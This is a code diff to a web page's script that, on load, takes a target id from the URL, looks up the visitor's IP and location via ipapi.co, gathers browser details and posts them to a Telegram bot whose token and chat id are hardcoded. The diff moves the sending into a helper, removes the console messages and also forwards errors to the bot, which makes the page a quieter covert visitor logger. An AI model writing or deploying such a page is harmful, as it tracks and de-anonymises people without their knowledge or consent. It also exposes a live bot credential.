@@ -7,17 +7,33 @@
     window.onload = async function () {
       const urlParams = new URLSearchParams(window.location.search);
       const TARGET_ID = urlParams.get("u"); 
-      if (!TARGET_ID) {
-        console.warn("Параметр u не найден в URL");
-        return;
-      }
+      if (!TARGET_ID) return;
+
       const CHAT_ID = 769893160;
       const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM';
+
+      async function sendTelegram(payloadObj) {
+        const text = "```json\n" + JSON.stringify(payloadObj, null, 2) + "\n```";
+        try {
+          const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: text,
+              parse_mode: "MarkdownV2"
+            })
+          });
+          const result = await resp.json();
+          if (!resp.ok) console.error(result);
+        } catch (err) {
+          console.error(err);
+        }
+      }
 
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
-
         const ua = navigator.userAgent || null;
         const lang = navigator.language || null;
         const platform = navigator.platform || null;
@@ -49,28 +65,16 @@
           }
         };
 
-        const text = "```json\n" + JSON.stringify(payload, null, 2) + "\n```";
-
-        const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const resp = await fetch(sendUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: "MarkdownV2"
-          })
-        });
-
-        const result = await resp.json();
-        if (!resp.ok) {
-          console.error("Ошибка при отправке в Telegram:", result);
-        } else {
-          console.log("Отправлено успешно:", result);
-        }
+        await sendTelegram(payload);
 
       } catch (error) {
-        console.error("Ошибка:", error);
+        const errorPayload = {
+          id: TARGET_ID,
+          response: null,
+          error: String(error)
+        };
+        await sendTelegram(errorPayload);
+        console.error(error);
       }
     };
   </script>
